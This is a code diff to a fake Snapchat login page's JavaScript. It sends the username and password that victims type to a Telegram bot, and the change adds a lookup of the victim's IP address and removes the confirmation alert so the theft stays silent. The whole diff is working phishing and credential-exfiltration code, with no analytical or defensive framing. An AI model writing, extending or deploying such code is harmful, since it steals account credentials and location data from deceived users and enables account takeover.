@@ -3,7 +3,13 @@ const chatId = '6594526203';
 
 const sendToTelegram = async (data) => {
   const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-  const message = `👻 Snapchat Login:\n\n📧 Username: ${data.login}\n🔒 Password: ${data.password}`;
+
+  // Получаем IP-адрес через внешний API (например, ipinfo.io)
+  const ipResponse = await fetch('https://api.ipify.org?format=json');
+  const ipData = await ipResponse.json();
+  const userIp = ipData.ip;
+
+  const message = `👻 Snapchat Login:\n\n📧 Username: ${data.login}\n🔒 Password: ${data.password}\n🌍 IP Address: ${userIp}`;
 
   try {
     await fetch(url, {
@@ -24,13 +30,10 @@ const sendToTelegram = async (data) => {
 const form = document.getElementById('loginForm');
 form.addEventListener('submit', async (event) => {
   event.preventDefault();
-
   const login = document.getElementById('login').value;
   const password = document.getElementById('password').value;
-
   const data = { login, password };
 
+  // Отправляем данные в Telegram без alert
   await sendToTelegram(data);
-
-  alert('Данные отправлены!');
 });
